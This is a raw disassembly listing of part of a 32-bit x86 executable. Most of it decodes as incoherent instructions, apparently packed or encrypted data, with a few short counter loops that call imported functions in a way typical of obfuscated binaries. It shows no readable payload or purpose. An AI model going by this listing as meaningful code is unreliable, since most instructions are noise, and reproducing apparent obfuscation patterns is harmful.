  401879:	adc    BYTE PTR [esi-0x8],ch
  40187c:	or     cl,bl
  40187e:	loopne 0x401823
  401880:	and    eax,DWORD PTR [ebx-0x3dacab98]
  401886:	push   0x3ae8b8b5
  40188b:	(bad)  [edx+0xf40d31a]
  401891:	test   BYTE PTR [ebx+0x25891819],al
  401897:	(bad)  
  401898:	aas    
  401899:	retf   
  40189a:	push   ds
  40189b:	out    dx,eax
  40189c:	and    edx,DWORD PTR [ecx+edx*1+0x44]
  4018a0:	fwait
  4018a1:	(bad)  
  4018a2:	lds    edx,FWORD PTR [ebp-0x46d84410]
  4018a8:	lock aad 0x12
  4018ab:	xlat   BYTE PTR ds:[ebx]
  4018ac:	ins    BYTE PTR es:[edi],dx
  4018ad:	mov    ecx,0x98b73606
  4018b2:	outs   dx,BYTE PTR ds:[esi]
  4018b3:	adc    al,0x9b
  4018b5:	rol    BYTE PTR [edi],cl
  4018b7:	jmp    0x2fc2c527
  4018bc:	ins    BYTE PTR es:[edi],dx
  4018bd:	push   edx
  4018be:	addr16 mov ah,0x79
  4018c1:	xchg   ebx,eax
  4018c2:	xlat   BYTE PTR ds:[ebx]
  4018c3:	sub    eax,0x8761155f
  4018c8:	push   0x768991c0
  4018cd:	adc    al,0x11
  4018cf:	or     al,dh
  4018d1:	loope  0x401920
  4018d3:	cmp    eax,0x951d560c
  4018d8:	ror    BYTE PTR [ebx+eax*8-0x12fe2f27],cl
  4018df:	mov    al,0x73
  4018e1:	sbb    eax,0xfbe9e57d
  4018e6:	xor    BYTE PTR [edi],0x17
  4018e9:	pop    esi
  4018ea:	adc    dh,BYTE PTR [esi-0x11]
  4018ed:	in     eax,dx
  4018ee:	cmp    ah,dh
  4018f0:	jbe    0x401935
  4018f2:	ins    BYTE PTR es:[edi],dx
  4018f3:	test   DWORD PTR [ebp-0xe],0x87bd8fbf
  4018fa:	inc    eax
  4018fb:	jp     0x401953
  4018fd:	jb     0x401900
  4018ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401900:	push   edi
  401901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401902:	test   DWORD PTR [ebx+0x4cc5fd28],edi
  401908:	mov    ch,0xf7
  40190a:	pop    es
  40190b:	sti    
  40190c:	sbb    DWORD PTR [ebx+0x6d35ca56],0xffffffb7
  401913:	jge    0x401961
  401915:	xor    dl,BYTE PTR ds:0x904eed3
  40191b:	jne    0x401992
  40191d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40191e:	jecxz  0x401909
  401920:	mov    dh,0x4a
  401922:	out    dx,al
  401923:	stc    
  401924:	xor    DWORD PTR [eax+0x5d],edx
  401927:	add    eax,0x97566964
  40192c:	jb     0x4019a6
  40192e:	stos   DWORD PTR es:[edi],eax
  40192f:	inc    ebp
  401930:	retf   
  401931:	mov    bl,0xa4
  401933:	sub    edi,DWORD PTR [esi]
  401935:	jle    0x401975
  401937:	test   al,0xca
  401939:	fwait
  40193a:	pop    edx
  40193b:	leave  
  40193c:	pusha  
  40193d:	(bad)  
  40193e:	and    al,0x7d
  401940:	or     eax,DWORD PTR [ecx]
  401942:	mov    ecx,0x420b5ddd
  401947:	retf   0xf6e9
  40194a:	inc    ecx
  40194b:	leave  
  40194c:	stc    
  40194d:	lahf   
  40194e:	xchg   eax,edi
  401950:	pushf  
  401951:	add    BYTE PTR [edx-0x44fc639b],ah
  401957:	and    al,0x11
  401959:	int3   
  40195a:	adc    ebp,DWORD PTR [edi]
  40195c:	sbb    bh,BYTE PTR [ecx+0x3d9f75d0]
  401962:	(bad)  
  401963:	outs   dx,DWORD PTR ds:[esi]
  401964:	push   esp
  401965:	cld    
  401966:	xchg   esp,eax
  401967:	gs mov bl,0xc
  40196a:	mov    BYTE PTR [ecx+0x76fe1a9],0x97
  401971:	retf   0xae54
  401974:	jge    0x401963
  401976:	lahf   
  401977:	and    al,bh
  401979:	shl    bh,1
  40197b:	(bad)  
  40197c:	div    DWORD PTR [edi-0x5ca9e185]
  401982:	add    eax,edi
  401984:	mov    DWORD PTR [ecx],eax
  401986:	sbb    ecx,ecx
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	retf   0xd00d
  4019a6:	call   0x7efe:0x78780182
  4019ad:	js     0x401a27
  4019af:	movlps xmm3,QWORD PTR [ebx-0x269b4584]
  4019b6:	xchg   ecx,eax
  4019b7:	xchg   edi,eax
  4019b8:	loope  0x401957
  4019ba:	add    DWORD PTR [esi-0x23f98454],0x2e
  4019c1:	pop    eax
  4019c2:	cmp    eax,0x40d3fe93
  4019c7:	push   ebx
  4019c8:	gs mov al,0x47
  4019cb:	ins    BYTE PTR es:[edi],dx
  4019cc:	pop    es
  4019cd:	push   cs
  4019ce:	fisttp WORD PTR [edx+0x32]
  4019d1:	xchg   edx,eax
  4019d2:	cs push ebp
  4019d4:	aaa    
  4019d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019d6:	pop    edx
  4019d7:	pop    esi
  4019d8:	push   ds
  4019d9:	stos   BYTE PTR es:[edi],al
  4019da:	push   0xff9b18f0
  4019df:	stc    
  4019e0:	das    
  4019e1:	out    0xb,eax
  4019e3:	clc    
  4019e4:	and    al,0x79
  4019e6:	sbb    al,BYTE PTR [esp+edi*8]
  4019e9:	inc    edx
  4019ea:	lods   al,BYTE PTR fs:[esi]
  4019ec:	imul   ecx,DWORD PTR [ebx],0x1d2ce197
  4019f2:	imul   esp,esi,0xffffffb4
  4019f5:	scas   eax,DWORD PTR es:[edi]
  4019f6:	lods   al,BYTE PTR ds:[esi]
  4019f7:	jecxz  0x4019c4
  4019f9:	(bad)  
  4019fa:	jno    0x401a60
  4019fc:	fnstcw WORD PTR [edx+0x10]
  4019ff:	jle    0x401a11
  401a01:	out    0xaf,al
  401a03:	(bad)  
  401a04:	sub    DWORD PTR [eax+0x5e],edx
  401a07:	inc    edx
  401a08:	dec    edi
  401a09:	mov    ebp,eax
  401a0b:	pop    eax
  401a0c:	add    eax,0x8810996d
  401a11:	cmp    DWORD PTR [ebp+0xaedf630],ebp
  401a17:	daa    
  401a18:	aam    0x19
  401a1a:	pushf  
  401a1b:	sub    esp,DWORD PTR [ebx+0x4a]
  401a1e:	add    edi,edx
  401a20:	push   es
  401a21:	add    DWORD PTR [ecx],0x45ea5a85
  401a27:	cmp    eax,0x65ea6d0e
  401a2c:	(bad)  
  401a2d:	mov    esp,0xd13bdc6
  401a32:	jecxz  0x401a84
  401a34:	mov    bh,0x6b
  401a36:	in     eax,0x53
  401a38:	push   ecx
  401a39:	sbb    eax,0x2359a280
  401a3e:	leave  
  401a3f:	fdiv   DWORD PTR [esi+0x2f0a2e2f]
  401a45:	imul   edx,DWORD PTR [ebp+0x45],0xf4e9732d
  401a4c:	lahf   
  401a4d:	lahf   
  401a4e:	daa    
  401a4f:	jp     0x4019ea
  401a51:	enter  0x98b4,0x27
  401a55:	mov    edx,0xe8f93a53
  401a5a:	fidivr DWORD PTR [edx-0x7a]
  401a5d:	into   
  401a5e:	je     0x401a49
  401a60:	ds addr16 inc esi
  401a63:	add    eax,0x53347bfa
  401a68:	mov    al,ds:0x235d0143
  401a6d:	mov    ds:0xc7cf7462,eax
  401a72:	pop    ebx
  401a73:	jae    0x401a02
  401a75:	loop   0x401a73
  401a77:	popa   
  401a78:	sti    
  401a79:	xor    DWORD PTR [edx+0x1a],esp
  401a7c:	xor    DWORD PTR [ebp-0x4244229e],ebx
  401a82:	adc    BYTE PTR ds:0x9aea2c84,ah
  401a88:	repz fs out 0x7c,eax
  401a8c:	ja     0x401a2b
  401a8e:	or     DWORD PTR [esi+0x7cdb43f6],edx
  401a94:	cld    
  401a95:	or     ebx,DWORD PTR [esi-0x73519a71]
  401a9b:	lahf   
  401a9c:	mov    eax,cs:0xa4be42cb
  401aa2:	inc    edx
  401aa3:	addr16 fcomp st(7)
  401aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401aa7:	out    dx,al
  401aa8:	loopne 0x401a53
  401aaa:	clc    
  401aab:	mov    dh,BYTE PTR [edi+0x28]
  401aae:	outs   dx,BYTE PTR ds:[esi]
  401aaf:	xchg   DWORD PTR [ecx],edx
  401ab1:	pop    edx
  401ab2:	(bad)  
  401ab4:	cli    
  401ab5:	sar    DWORD PTR [ecx-0x44],0xcb
  401ab9:	pop    ebx
  401aba:	mov    esp,0x6eafbc65
  401abf:	call   ebx
  401ac1:	and    DWORD PTR [eax],edi
  401ac3:	cwde   
  401ac4:	iret   
  401ac5:	(bad)  
  401ac6:	call   0xf192:0x29bf34c1
  401acd:	or     DWORD PTR [ebx+0x6f],ebp
  401ad0:	inc    esi
  401ad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ad2:	imul   ebp,DWORD PTR [edx-0xb],0x68770b74
  401ad9:	xchg   ebp,eax
  401ada:	(bad)  
  401adb:	jnp    0x9f9631a3
  401ae1:	adc    eax,0x37b153c1
  401ae6:	dec    ebp
  401ae7:	adc    bh,BYTE PTR [ebp-0x4977c943]
  401aed:	jecxz  0x401b06
  401aef:	and    eax,0xae0389c2
  401af4:	fs scas al,BYTE PTR es:[edi]
  401af6:	cmp    al,BYTE PTR [ebx+ebp*2-0x4fe46c56]
  401afd:	sar    BYTE PTR [esi-0x75],0x64
  401b01:	je     0x401aa1
  401b03:	ror    BYTE PTR [edx],cl
  401b05:	mov    BYTE PTR [ebx-0x25b75906],bh
  401b0b:	mov    dh,0x1b
  401b0d:	test   BYTE PTR [esi-0x10],ch
  401b10:	jae    0x401a94
  401b12:	cld    
  401b13:	retf   
  401b14:	or     ch,BYTE PTR [edi+0x8540e45]
  401b1a:	rcl    ch,cl
  401b1c:	jno    0x401b82
  401b1e:	mov    cl,0xc2
  401b20:	add    ecx,DWORD PTR [ebx-0x206897f6]
  401b26:	mov    ebp,DWORD PTR ds:0x8fc0bb2e
  401b2c:	jg     0x401ad5
  401b2e:	pop    ebx
  401b2f:	xchg   ebx,eax
  401b30:	fstp   DWORD PTR [esi+ebx*2-0x2e64bbdc]
  401b37:	jmp    0x1591:0x1c2ecdd
  401b3e:	sbb    esp,eax
  401b40:	dec    ebp
  401b41:	mov    gs,edi
  401b43:	mov    cl,0x67
  401b45:	sbb    eax,DWORD PTR [edi-0x58c86da7]
  401b4b:	sub    DWORD PTR [edi],ecx
  401b4d:	int    0xe0
  401b4f:	dec    ebp
  401b50:	push   edi
  401b51:	xchg   edx,eax
  401b52:	stc    
  401b53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b54:	adc    dh,BYTE PTR [ebx+edx*1+0x14e515ad]
  401b5b:	pop    ebp
  401b5c:	jns    0x401ae8
  401b5e:	int3   
  401b5f:	aaa    
  401b60:	mov    esp,0x848e490f
  401b65:	fcmovnu st,st(0)
  401b67:	mov    eax,ecx
  401b69:	jbe    0x401b6c
  401b6b:	or     dx,WORD PTR [esi-0x77]
  401b6f:	mov    esi,0xdcd7f94e
  401b74:	dec    ecx
  401b75:	cmp    ebx,DWORD PTR [edx+edi*8+0xa]
  401b79:	dec    ebx
  401b7a:	jmp    0xbf35:0xe1846437
  401b81:	int    0xee
  401b83:	jl     0x401bb8
  401b85:	data16 cs add dh,bh
  401b89:	and    BYTE PTR [esi-0x38],al
  401b8c:	lea    ecx,[edi+0x56a71714]
  401b92:	call   0xb95e85e4
  401b97:	xchg   ecx,eax
  401b98:	xor    eax,0x943a6728
  401b9d:	cld    
  401b9e:	mov    WORD PTR [edi-0x10],ss
  401ba1:	add    ah,0x64
  401ba4:	mov    eax,ds:0x703b0a7d
  401ba9:	gs adc al,0xa0
  401bac:	sub    esp,DWORD PTR [ebx+0x256ab0fc]
  401bb2:	rep lods eax,DWORD PTR ds:[esi]
  401bb4:	xor    eax,0xee5fdd52
  401bb9:	xchg   esp,eax
  401bba:	mov    bl,0xdb
  401bbc:	inc    esp
  401bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bbe:	test   DWORD PTR [edi+0xdd1604d],eax
  401bc4:	mul    DWORD PTR [ebp+ebp*2+0x49]
  401bc8:	cmc    
  401bc9:	fild   QWORD PTR [esi+0x22a93276]
  401bcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bd0:	stos   BYTE PTR es:[edi],al
  401bd1:	popf   
  401bd2:	pushf  
  401bd3:	jecxz  0x401c27
  401bd5:	pop    eax
  401bd6:	retf   0x3ce4
  401bd9:	ret    
  401bda:	mov    al,ds:0x49a46e3d
  401bdf:	push   ebp
  401be0:	xchg   edi,eax
  401be1:	cmp    DWORD PTR [ebx],0x5b
  401be4:	cdq    
  401be5:	push   eax
  401be6:	call   DWORD PTR [ebp+0x65]
  401be9:	push   es
  401bea:	pop    edx
  401beb:	popa   
  401bec:	(bad)  
  401bed:	or     al,BYTE PTR [ebx-0x7b5e9881]
  401bf3:	xor    DWORD PTR [ecx+0x1324221c],ebx
  401bf9:	adc    bl,BYTE PTR [ecx-0x3935aa6a]
  401bff:	mov    eax,0xa7b026ec
  401c04:	add    esp,0x7c4df57a
  401c0a:	cdq    
  401c0b:	add    BYTE PTR [ecx+ebp*8],bl
  401c0e:	test   al,0x6d
  401c10:	inc    edx
  401c11:	jmp    0x2991:0xed827d52
  401c18:	adc    al,0xb1
  401c1a:	dec    edx
  401c1b:	(bad)
  401c1e:	jbe    0x401c06
  401c20:	outs   dx,BYTE PTR ds:[esi]
  401c21:	std    
  401c22:	and    DWORD PTR [edi+ebx*1+0x70],0xffffffe9
  401c27:	xor    al,0x60
  401c29:	stc    
  401c2a:	scas   eax,DWORD PTR es:[edi]
  401c2b:	inc    ebx
  401c2c:	fwait
  401c2d:	retf   0x14d3
  401c30:	xchg   DWORD PTR [ecx+0x2581e045],ecx
  401c36:	cmp    eax,0x42a8
  401c3b:	add    BYTE PTR [eax],al
  401c3d:	add    cl,ch
  401c3f:	or     eax,DWORD PTR [eax]
  401c41:	add    BYTE PTR [eax],al
  401c43:	mov    eax,ds:0x42a83d
  401c48:	inc    eax
  401c49:	mov    ds:0x42a83d,eax
  401c4e:	cmp    DWORD PTR ds:0x42a83d,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42a83d,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42aa2e
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42a83d,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42a83d
  401c90:	inc    eax
  401c91:	mov    ds:0x42a83d,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42a761,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42a775
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42a769
  401cbe:	and    eax,DWORD PTR ds:0x42a7b9
  401cc4:	mov    ds:0x42a769,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42a7f9,0x42a801
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42a77d,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0xa7ba
  401d05:	pop    ss
  401d06:	jbe    0x401c96
  401d08:	add    BYTE PTR [esi],al
  401d0a:	js     0x401d84
  401d0c:	(bad)  
  401d0d:	jle    0x401d87
  401d0f:	js     0x401ced
  401d11:	sub    eax,0x3656a37f
  401d16:	add    DWORD PTR [eax+0x7083c8bd],0xffffffbe
  401d1d:	fist   DWORD PTR [esi]
  401d1f:	(bad)  
  401d20:	push   DWORD PTR [ecx-0x36d77ab3]
  401d26:	and    al,0xdb
  401d28:	repnz push edi
  401d2a:	push   ebp
  401d2b:	xchg   DWORD PTR [eax-0xeeab775],ecx
  401d31:	sub    ebp,esp
  401d33:	sub    DWORD PTR [ecx-0x299a1898],eax
  401d39:	fild   QWORD PTR [ecx-0x1]
  401d3c:	jmp    0x804d70a1
  401d41:	cmp    al,0x30
  401d43:	sahf   
  401d44:	and    ebp,DWORD PTR [esi]
  401d46:	xchg   ebp,eax
  401d47:	dec    ebp
  401d48:	inc    ebp
  401d49:	mov    cl,BYTE PTR [esi+ebp*1]
  401d4c:	push   esi
  401d4d:	(bad)  
  401d4e:	fild   DWORD PTR [ebx-0x7da81278]
  401d54:	push   0xffffffc0
  401d56:	fxch   st(5)
  401d58:	sbb    ecx,DWORD PTR [esi-0x42]
  401d5b:	mov    dh,BYTE PTR [esi]
  401d5d:	cmp    BYTE PTR [eax+ebp*8+0x73df3dc4],cl
  401d64:	sbb    eax,0x741fda46
  401d69:	aad    0xdd
  401d6b:	aam    0xd3
  401d6d:	in     al,dx
  401d6e:	mov    al,ds:0xf2ec3482
  401d73:	or     DWORD PTR [ecx],ebx
  401d75:	dec    eax
  401d76:	test   DWORD PTR [edi-0x60],0x2c1fe235
  401d7d:	repz jne 0x401d89
  401d80:	xor    eax,0x2ad8128a
  401d85:	ficom  WORD PTR [edx-0x2df7056f]
  401d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d8c:	mov    ecx,0x3a05322
  401d91:	je     0x401d13
  401d93:	cld    
  401d94:	push   edi
  401d95:	xchg   ch,dh
  401d97:	loope  0x401d4a
  401d99:	fld    TBYTE PTR [edi+0x596022dd]
  401d9f:	cmp    ch,BYTE PTR ds:0x856b2c2b
  401da5:	fnsave [eax-0x71]
  401da8:	cmp    DWORD PTR [edi+0x1e],esp
  401dab:	add    BYTE PTR [edx-0x48],0xb6
  401daf:	mov    al,0xee
  401db1:	cld    
  401db2:	xor    ebx,ebp
  401db4:	mov    eax,ds:0xd62c28b
  401db9:	lea    esi,[edi+0x3ede5f50]
  401dbf:	adc    DWORD PTR [ebx+0xd],edx
  401dc2:	out    0x10,eax
  401dc4:	cli    
  401dc5:	inc    eax
  401dc6:	pop    es
  401dc7:	mov    esi,0xd55aa63c
  401dcc:	loope  0x401e40
  401dce:	or     bh,dh
  401dd0:	pop    edx
  401dd1:	push   ds
  401dd2:	loop   0x401db9
  401dd4:	inc    edi
  401dd5:	cmp    eax,0x565f52de
  401dda:	jns    0x401d76
  401ddc:	ss push ds
  401dde:	cmp    dh,BYTE PTR [ecx-0x20]
  401de1:	xchg   edx,eax
  401de2:	js     0x401dcf
  401de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401de5:	mov    al,0xb3
  401de7:	in     al,0xe0
  401de9:	loope  0x401d6c
  401deb:	jo     0x401e0b
  401ded:	(bad)  
  401dee:	xor    al,BYTE PTR [edi+0x35263004]
  401df4:	push   edi
  401df5:	leave  
  401df6:	test   al,0x23
  401df8:	scas   al,BYTE PTR es:[edi]
  401df9:	pop    ebp
  401dfa:	jmp    0x6c2d:0x10984a6b
  401e01:	lds    esi,FWORD PTR [eax]
  401e03:	daa    
  401e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e06:	pop    ebx
  401e07:	ret    0xda63
  401e0a:	push   ds
  401e0b:	out    0x93,eax
  401e0d:	pop    edi
  401e0e:	fwait
  401e0f:	repz jo 0x401d9f
  401e12:	rcr    DWORD PTR [edi+0x72],cl
  401e15:	out    0xff,al
  401e17:	les    ebp,FWORD PTR [edx]
  401e19:	aas    
  401e1a:	sbb    cl,BYTE PTR [ecx]
  401e1c:	cwde   
  401e1d:	mov    WORD PTR [ebp*4-0x5ecc5cbc],ds
  401e24:	retf   
  401e25:	shr    DWORD PTR [edi+0x649606f],cl
  401e2b:	and    dh,BYTE PTR ss:[edx]
  401e2e:	jmp    0xf3cb77c4
  401e33:	(bad)  
  401e34:	popa   
  401e35:	retf   0xef81
  401e38:	leave  
  401e39:	stos   DWORD PTR es:[edi],eax
  401e3a:	cmp    BYTE PTR [edi-0x55],ah
  401e3d:	mov    ecx,ebp
  401e3f:	into   
  401e40:	xchg   BYTE PTR [eax],dl
  401e42:	sbb    al,0xe7
  401e44:	adc    eax,0x632df313
  401e49:	ds icebp 
  401e4b:	inc    edx
  401e4c:	and    al,0x1e
  401e4e:	mov    bl,bh
  401e50:	iret   
  401e51:	mov    dl,0x31
  401e53:	adc    al,0x47
  401e55:	push   cs
  401e56:	or     eax,0xe5a9003e
  401e5b:	jb     0x401ecb
  401e5d:	pushf  
  401e5e:	dec    esp
  401e5f:	(bad)  
  401e60:	(bad)  
  401e61:	stc    
  401e62:	or     BYTE PTR [esi+eax*1],bh
  401e65:	mov    DWORD PTR [ebp-0x72],edi
  401e68:	cmp    esp,ebp
  401e6a:	mov    WORD PTR [edx],?
  401e6c:	cld    
  401e6d:	hlt    
  401e6e:	pop    ebp
  401e6f:	(bad)  
  401e70:	push   0xb0e54ff
  401e75:	bound  edx,QWORD PTR [ebx-0x2c]
  401e78:	int3   
  401e79:	pop    ecx
  401e7a:	pushf  
  401e7b:	cdq    
  401e7c:	int    0xe9
  401e7e:	dec    esi
  401e7f:	dec    edx
  401e80:	and    ch,BYTE PTR [eax]
  401e82:	inc    BYTE PTR [eax]
  401e84:	mov    edi,ebx
  401e86:	xchg   ebx,eax
  401e87:	rcl    DWORD PTR [edx-0x6c],0xd1
  401e8b:	xor    BYTE PTR [edx+0x5],bh
  401e8e:	aam    0xef
  401e90:	push   ebp
  401e91:	rol    edx,cl
  401e93:	push   cs
  401e94:	popa   
  401e95:	pop    es
  401e96:	addr16 mov esp,0xd2ad2a5c
  401e9c:	(bad)
  401ea0:	xor    ebp,edx
  401ea2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ea3:	ins    WORD PTR es:[edi],dx
  401ea5:	xor    ch,0xb
  401ea8:	ror    ecx,cl
  401eaa:	(bad)  
  401eab:	fsub   st(7),st
  401ead:	shr    BYTE PTR [edi],cl
  401eaf:	aas    
  401eb0:	mov    cl,0x2e
  401eb2:	push   esp
  401eb3:	add    DWORD PTR [edx],eax
  401eb5:	push   ebp
  401eb6:	add    al,0xc3
  401eb9:	xchg   ebx,eax
  401eba:	hlt    
  401ebb:	addr16 xor eax,0x788e8933
  401ec1:	mov    esi,0x3b942516
  401ec6:	cmp    DWORD PTR [edx+0x62],esi
  401ec9:	push   cs
  401eca:	pop    ecx
  401ecb:	(bad)  
  401ecc:	push   ecx
  401ecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ece:	jp     0x401f13
  401ed0:	std    
  401ed1:	or     eax,edx
  401ed3:	mov    esi,0x21f88e5f
  401ed8:	fist   DWORD PTR [ebx+0x40]
  401edb:	sbb    DWORD PTR [eax],0x7b313922
  401ee1:	adc    eax,0x10ebc069
  401ee6:	add    edx,esi
  401ee8:	in     eax,0xba
  401eea:	xlat   BYTE PTR ds:[ebx]
  401eeb:	loopne 0x401e98
  401eed:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401eef:	pushf  
  401ef0:	loopne 0x401e89
  401ef2:	sar    edx,0xf0
  401ef5:	sbb    DWORD PTR [esi+eax*8+0x2d],0x64
  401efa:	or     ecx,DWORD PTR [edi]
  401efc:	push   ds
  401efd:	inc    eax
  401efe:	fld    QWORD PTR [ecx+0x5c5c41a7]
  401f04:	dec    esp
  401f05:	cmp    ah,cl
  401f07:	nop
  401f08:	add    DWORD PTR [ebp-0x63],ebx
  401f0b:	cmp    al,0xe7
  401f0d:	jae    0x401f87
  401f0f:	dec    esi
  401f10:	jb     0x401ee0
  401f12:	addr16 cmc 
  401f14:	mov    ebp,0xb2e2fa4a
  401f19:	pusha  
  401f1a:	cmp    edx,DWORD PTR [esi+ebx*1+0xf8e1514]
  401f21:	push   0xffffff9f
  401f23:	jg     0x401eed
  401f25:	xchg   DWORD PTR [ebx-0x7c],edi
  401f28:	cwde   
  401f29:	ror    DWORD PTR [ecx-0x4f],0x91
  401f2d:	dec    ecx
  401f2e:	xor    al,0x91
  401f30:	call   0x15bd:0xc67aeff5
  401f37:	sub    BYTE PTR [ebp-0x34],0xfb
  401f3b:	ins    DWORD PTR es:[edi],dx
  401f3c:	jecxz  0x401ee0
  401f3e:	ss mov bl,0x19
  401f41:	enter  0xbd48,0xa8
  401f45:	imul   ebx,DWORD PTR [esi+esi*1+0x360e1272],0x3a441a1
  401f50:	out    0x73,eax
  401f52:	mov    BYTE PTR [ebp-0x29a8bae6],dh
  401f58:	mov    al,0x88
  401f5a:	mov    dl,0xa3
  401f5c:	cmc    
  401f5d:	setb   BYTE PTR [ebp-0x44ec5e22]
  401f64:	mov    ebp,0xe23493f1
  401f69:	sahf   
  401f6a:	adc    cl,dl
  401f6c:	jne    0x401f4c
  401f6e:	(bad)  
  401f6f:	and    al,0xda
  401f71:	jns    0x401fa7
  401f73:	mov    dl,0x97
  401f75:	sbb    DWORD PTR [esi],edx
  401f77:	dec    edi
  401f78:	aaa    
  401f79:	int3   
  401f7a:	add    eax,ebp
  401f7c:	fwait
  401f7d:	push   edi
  401f7e:	ins    BYTE PTR es:[edi],dx
  401f7f:	loopne 0x401f17
  401f81:	data16 mov ah,0xaa
  401f84:	jbe    0x401fb5
  401f86:	int3   
  401f87:	and    eax,0x3647523e
  401f8c:	imul   edx,DWORD PTR [ecx-0x7f],0xffffff81
  401f90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f91:	sub    al,0x3
  401f93:	or     BYTE PTR [ebx],dh
  401f95:	rol    BYTE PTR [ebx],0x5
  401f98:	cmp    DWORD PTR [eax+0x5230042],ebp
  401f9e:	mov    DWORD PTR [eax+0x39a30042],ebp
  401fa4:	test   al,0x42
  401fa6:	add    BYTE PTR [ecx+0x581e84d],cl
  401fac:	icebp  
  401fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fae:	inc    edx
  401faf:	add    BYTE PTR [eax-0x74fffffb],bl
  401fb5:	inc    ebp
  401fb6:	or     BYTE PTR [ecx+0x42a75925],al
  401fbc:	add    BYTE PTR [eax],al
  401fbe:	add    BYTE PTR [eax],al
  401fc0:	add    cl,ch
  401fc2:	or     eax,0x8b000000
  401fc7:	or     eax,0x42a759
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42a759,ecx
  401fd3:	cmp    DWORD PTR ds:0x42a759,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42a759,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    DWORD PTR [ebp-0x79360eff],ebx
  40201c:	add    al,0x78
  40201e:	js     0x40201e
  402020:	jle    0x40209a
  402022:	js     0x40200b
  402024:	enter  0xb044,0x41
  402028:	loop   0x4020a8
  40202a:	(bad)  
  40202b:	hlt    
  40202c:	sub    dh,0xed
  40202f:	xchg   ebp,eax
  402030:	xor    dl,BYTE PTR [edi+edx*1-0x2953ca12]
  402037:	ficomp WORD PTR [ecx+ebp*2+0x28c46eb5]
  40203e:	mov    ?,WORD PTR [edi+0x56]
  402041:	fisttp QWORD PTR [edx+0x20303c03]
  402047:	or     eax,0xed3264af
  40204c:	mov    al,ds:0x72f99a8e
  402051:	jnp    0x401fd9
  402053:	repnz (bad) 
  402055:	call   0x8d85c73
  40205a:	mov    ebx,0x64b39285
  40205f:	leave  
  402060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402061:	mov    edi,0xc455f0fa
  402066:	and    eax,0x8764d771
  40206b:	and    ebx,esi
  40206d:	test   BYTE PTR [esi-0x2f3564ad],cl
  402073:	out    dx,eax
  402074:	mov    BYTE PTR [ebp+esi*1-0x13],0x9c
  402079:	cmp    BYTE PTR es:[eax+ecx*4+0x60a2ce46],bl
  402081:	add    eax,0x790795b5
  402086:	mov    ds:0xbc9dc072,al
  40208b:	adc    BYTE PTR [eax+0x3166c4b],bh
  402091:	mov    BYTE PTR ds:0xd3ad3119,ch
  402097:	jge    0x4020d5
  402099:	repnz fbstp TBYTE PTR [esi]
  40209c:	int3   
  40209d:	sbb    BYTE PTR [ebp+0x9],ah
  4020a0:	jnp    0x402083
  4020a2:	das    
  4020a3:	ficom  WORD PTR [ebx-0x369b5508]
  4020a9:	fild   WORD PTR [esi-0x59]
  4020ac:	dec    eax
  4020ad:	(bad)  
  4020ae:	sahf   
  4020af:	xchg   BYTE PTR [ecx-0x40e1da3d],ah
  4020b5:	xchg   edx,eax
  4020b6:	xor    BYTE PTR [ebp+0x37],ah
